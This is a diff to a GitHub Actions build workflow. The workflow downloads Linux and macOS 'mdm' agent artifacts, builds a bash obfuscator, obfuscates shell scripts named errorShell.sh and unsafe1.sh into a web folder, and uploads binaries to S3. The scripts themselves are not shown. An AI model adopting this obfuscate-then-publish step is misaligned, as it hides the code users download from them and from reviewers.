@@ -113,13 +113,33 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v6.0.2
 
-      - name: Download all artifacts
+      - name: Download Linux artifact (compressed)
         uses: actions/download-artifact@v7
         with:
+          name: artifact-linux-server-amd64
           path: src
+
+      - name: Download macOS artifacts (uncompressed)
+        uses: actions/download-artifact@v7
+        with:
+          pattern: artifact-macos-agent-*
+          path: src
+          merge-multiple: true
+
+#      - name: Extract Linux artifact
+#        run: |
+#          cd artifacts/linux
+#          unzip -o *.zip -d ../../src/ || tar -xzf *.tar.gz -C ../../src/ || cp -v mdm-linux-amd64 ../../src/
+#          cd -
+
+#      - name: Prepare binaries
+#        run: |
+#          chmod +x src/mdm-*-*
+#          ls -lh src/
 
       - name: Install tools
         run: |
+          tree
           sudo apt-get update -qq
           sudo apt-get install -qq coreutils dos2unix
           npm install -g serverless-cloud-framework pkg
@@ -128,19 +148,19 @@ jobs:
           pkg node-bash-obfuscate -t node16-linux-x64 -o src/bash-obfuscate
           rm -rf node-bash-obfuscate
 
-      - name: Prepare scripts and binaries
+      - name: Obfuscate scripts
         run: |
-          find $PWD/src -name "mdm-*-*" -exec cp -v {} src/ \;
-          find $PWD/src -name "artifact-*" -type d -prune -exec rm -rf {} \;
+          # find $PWD/src -name "mdm-*-*" -exec cp -v {} src/ \;
+          # find $PWD/src -name "artifact-*" -type d -prune -exec rm -rf {} \;
           # md5sum src/mdm-darwin-arm64 | cut -d ' ' -f1 > src/mdm-darwin-arm64.md5
           # md5sum src/mdm-darwin-amd64 | cut -d ' ' -f1 > src/mdm-darwin-amd64.md5
           # if [ -f src/mdm-darwin-universal ]; then
             # md5sum src/mdm-darwin-universal | cut -d ' ' -f1 > src/mdm-darwin-universal.md5
           # fi
-          src/bash-obfuscate shell/errorShell.sh  -o html/errorShell.sh
+          src/bash-obfuscate shell/errorShell.sh -o html/errorShell.sh
           src/bash-obfuscate shell/unsafe1.sh -o html/unsafe1.sh
           cp -v shell/unsafe0.sh html/unsafe0.sh
-          cp -v shell/cli.sh     html/cli.sh
+          cp -v shell/cli.sh html/cli.sh
 
       - name: Upload to S3
         env:
@@ -149,9 +169,8 @@ jobs:
           AWS_DEFAULT_REGION: ${{ secrets.AWS_DEFAULT_REGION }}
           AWS_ENDPOINT_URL: ${{ secrets.AWS_ENDPOINT_URL }}
         run: |
-          tree
-          aws s3 --endpoint-url ${{ secrets.AWS_ENDPOINT_URL }} cp src/mdm-darwin-amd64        s3://xrsec/MDM/mdm-darwin-amd64
-          aws s3 --endpoint-url ${{ secrets.AWS_ENDPOINT_URL }} cp src/mdm-darwin-arm64        s3://xrsec/MDM/mdm-darwin-arm64
+          aws s3 --endpoint-url ${{ secrets.AWS_ENDPOINT_URL }} cp src/mdm-darwin-amd64 s3://xrsec/MDM/mdm-darwin-amd64
+          aws s3 --endpoint-url ${{ secrets.AWS_ENDPOINT_URL }} cp src/mdm-darwin-arm64 s3://xrsec/MDM/mdm-darwin-arm64
           if [ -f src/mdm-darwin-universal ]; then
             aws s3 --endpoint-url ${{ secrets.AWS_ENDPOINT_URL }} cp src/mdm-darwin-universal  s3://xrsec/MDM/mdm-darwin-universal
           fi
